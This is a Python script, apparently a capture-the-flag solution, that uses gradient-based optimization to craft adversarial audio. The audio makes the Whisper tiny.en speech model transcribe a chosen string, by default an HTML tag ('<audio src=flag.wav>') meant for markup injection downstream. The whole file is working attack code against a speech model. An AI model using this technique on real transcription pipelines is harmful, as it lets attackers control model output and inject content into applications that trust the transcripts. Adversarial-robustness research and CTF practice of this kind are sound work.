#!/usr/bin/env python3
"""White-box targeted audio optimization for the exact Whisper tiny.en model."""
import argparse, json, math, os, sys, time, wave
import numpy as np
import torch, torch.nn.functional as F
import whisper
from whisper.tokenizer import get_tokenizer

p=argparse.ArgumentParser()
p.add_argument('--input',default='literal1.mp3')
p.add_argument('--output',default='adversarial.wav')
p.add_argument('--target',default=' <audio src=flag.wav>')
p.add_argument('--steps',type=int,default=800)
p.add_argument('--lr',type=float,default=0.01)
p.add_argument('--seconds',type=float,default=7.0)
p.add_argument('--check',type=int,default=25)
a=p.parse_args()

torch.manual_seed(1337)
device='cuda'
model=whisper.load_model('tiny.en',device=device)
model.eval()
for q in model.parameters(): q.requires_grad_(False)
tok=get_tokenizer(multilingual=False,language='en',task='transcribe')
print('target',repr(a.target),'tokens',tok.encode(a.target),flush=True)

orig=torch.from_numpy(whisper.load_audio(a.input)).float()
n=min(int(a.seconds*whisper.audio.SAMPLE_RATE), whisper.audio.N_SAMPLES)
base=torch.zeros(n)
base[:min(n,len(orig))]=orig[:n]
# Direct waveform variable; no imperceptibility requirement in this CTF.
x=torch.nn.Parameter(base.to(device))
opt=torch.optim.Adam([x],lr=a.lr)

prefix_ts=list(tok.sot_sequence) # SOT, language, transcribe; timestamp mode
end_ts=tok.timestamp_begin + max(1,round(a.seconds/0.02))
desired_ts=[tok.timestamp_begin]+tok.encode(a.target)+[end_ts,tok.eot]
prefix_nt=list(tok.sot_sequence_including_notimestamps)
desired_nt=tok.encode(a.target)+[tok.eot]

def seq_loss(audio,prefix,desired):
    padded=F.pad(audio,(0,whisper.audio.N_SAMPLES-audio.numel()))
    mel=whisper.log_mel_spectrogram(padded,n_mels=model.dims.n_mels).to(device)
    feats=model.encoder(mel.unsqueeze(0))
    inp=torch.tensor([prefix+desired[:-1]],device=device)
    logits=model.decoder(inp,feats)
    start=len(prefix)-1
    chosen=logits[:,start:start+len(desired),:].float().reshape(-1,logits.shape[-1])
    target=torch.tensor(desired,device=device)
    # The mean loss can hide one decisive early token (typically a slash or quote).  Greedy
    # decoding then diverges even when teacher-forced accuracy is >95%.  Explicitly optimize the
    # worst token as well so every token crosses the argmax margin.
    per_token=F.cross_entropy(chosen,target,reduction='none')
    return per_token.mean()+0.75*per_token.max(),chosen,target

def save(path,audio):
    y=(audio.detach().float().cpu().clamp(-1,1).numpy()*32767).astype('<i2')
    with wave.open(path,'wb') as w:
        w.setnchannels(1);w.setsampwidth(2);w.setframerate(16000);w.writeframes(y.tobytes())

def decode_text(audio,without=False):
    padded=F.pad(audio.detach(),(0,whisper.audio.N_SAMPLES-audio.numel()))
    mel=whisper.log_mel_spectrogram(padded,n_mels=model.dims.n_mels).to(device)
    o=whisper.DecodingOptions(language='en',task='transcribe',fp16=True,without_timestamps=without,suppress_tokens='')
    return model.decode(mel,o)

starttime=time.time()
best=1e9
for step in range(a.steps+1):
    opt.zero_grad(set_to_none=True)
    lts,chosen,target=seq_loss(x,prefix_ts,desired_ts)
    lnt,_,_=seq_loss(x,prefix_nt,desired_nt)
    # Avoid excessive clipping while freely changing the audible waveform.
    reg=(F.relu(x.abs()-0.98)**2).mean()*10
    loss=lts+0.35*lnt+reg
    if step:
        loss.backward(); opt.step()
        with torch.no_grad(): x.clamp_(-1,1)
    if float(loss)<best:
        best=float(loss);save(a.output,x)
    if step%a.check==0 or step==a.steps:
        with torch.no_grad():
            pred=chosen.argmax(-1); acc=(pred==target).float().mean().item()
            dts=decode_text(x,False); dnt=decode_text(x,True)
        save(a.output,x)
        print(json.dumps({'step':step,'loss':float(loss),'loss_ts':float(lts),'loss_nt':float(lnt),'tf_acc':acc,'decode_ts':dts.text,'tokens_ts':dts.tokens,'decode_nt':dnt.text,'elapsed':time.time()-starttime}),flush=True)
        if dts.text.strip()==a.target.strip() or a.target.strip() in dts.text:
            print('TARGET_DECODE_REACHED',flush=True); break
save(a.output,x)
print('saved',a.output,'best',best,flush=True)
